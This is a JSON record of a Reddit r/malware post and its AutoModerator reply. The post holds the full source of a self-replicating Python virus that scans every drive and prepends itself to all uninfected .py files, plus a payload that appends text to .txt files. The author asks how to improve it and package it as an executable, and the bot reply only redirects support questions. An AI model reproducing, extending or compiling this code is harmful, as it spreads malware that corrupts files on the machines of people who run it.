@@ -1,0 +1,33 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "`##### VIRUS BEGIN #####`\n\n`import sys, re, os`\n\n`# checks for vaccine`\n\n`vaccinated = False`\n\n`try:`\n\n`path2 = os.path.expanduser(\"~\\\\Documents\")+\"\\\\vaxx.txt\"`\n\n`except:`\n\n`path2 = \"Documents\\\\vaxx.txt\"`\n\n`if os.path.exists(path2):`\n\n`vaccinated = True`\n\n`# Get a copy of the virus`\n\n`vCode = []`\n\n&amp;#x200B;\n\n`fh = open(str(sys.argv[0]), \"r\")`\n\n`lines = fh.readlines()`\n\n`fh.close()`\n\n`inVirus = False`\n\n`for line in lines:`\n\n`if (re.search('^##### VIRUS BEGIN #####', line)): inVirus = True`\n\n`if (inVirus): vCode.append(line)`\n\n`if (re.search('^##### VIRUS END #####', line)): break`\n\n&amp;#x200B;\n\n`# Find potential victims and infects them (one by one)`\n\n`for d in range(65, 91):`\n\n`if os.path.exists(chr(d)+\":\") and not os.path.exists(chr(d)+\":\\\\vaxx.txt\") and not (chr(d) == path2[0] and vaccinated):`\n\n`for root, dirs, files in os.walk(chr(d)+':\\\\'):`\n\n`for file in files:`\n\n`if file.endswith('.py') or file.endswith('.pyw'):`\n\n`prog = str(root)+\"\\\\\"+file`\n\n`try:`\n\n`fh = open(prog, \"r\")`\n\n`pCode = fh.readlines()`\n\n`fh.close()`\n\n`infected = False`\n\n`for line in pCode:`\n\n`if ('##### VIRUS BEGIN #####' in line):`\n\n`infected = True`\n\n`break`\n\n`if not infected:`\n\n`newCode = []`\n\n`newCode.extend(vCode)`\n\n`newCode.extend(pCode)`\n\n`fh = open(prog, 'w')`\n\n`fh.writelines(newCode)`\n\n`fh.close()`\n\n`except:`\n\n`pass`\n\n`# Optional Payload`\n\n`if not vaccinated:`\n\n`txts = []`\n\n`for root, dirs, files in os.walk(dest):`\n\n`for file in files:`\n\n`if file.endswith('.txt'):`\n\n`txts.append(str(root)+\"//\"+file)`\n\n`for txt in txts:`\n\n`try:`\n\n`# Writing new virus infected code`\n\n`fh = open(txt, 'a')`\n\n`fh.write(\"\\ninfected\\n\"*10)`\n\n`fh.close()`\n\n`except:`\n\n`pass`\n\n`##### VIRUS END #####`",
+        "title": "here is a cute and useless virus I made in python. Any ways to improve this? and how would I be able to make this work as an exe file? (the vaccinated variable is just an extra precaution to make sure I don't shoot myself in the foot.)",
+        "score": 1,
+        "id": "f12hkt",
+        "commsNum": 1,
+        "timeStamp": "2020/02/08-18:57:50",
+        "author_name": "DareDevil0310",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 1,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/f12hkt/here_is_a_cute_and_useless_virus_i_made_in_python/"
+    },
+    "posts": {
+        "fh1kije": {
+            "comment": "It looks like you are posting a question, possibly looking for technical support. \n\nThis subreddit\u2019s purpose is to discuss malware internals and technical details. *This is NOT a place for help with malware removal or various other end-user questions. Please redirect questions related to malware removal to /r/Antivirus or /r/techsupport. Ransomware related questions can be directed to /r/ransomware*\n\nIf this was removed in error, please message the moderators - we love reading quality content just as much as you do!\n\n\n*I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Malware) if you have any questions or concerns.*",
+            "timeStamp": "2020/02/08-18:57:50",
+            "id": "fh1kije",
+            "is_submitter": false,
+            "link_id": "t3_f12hkt",
+            "parent_id": "t3_f12hkt",
+            "score": 1,
+            "stickied": false,
+            "author_name": "AutoModerator"
+        }
+    }
+}
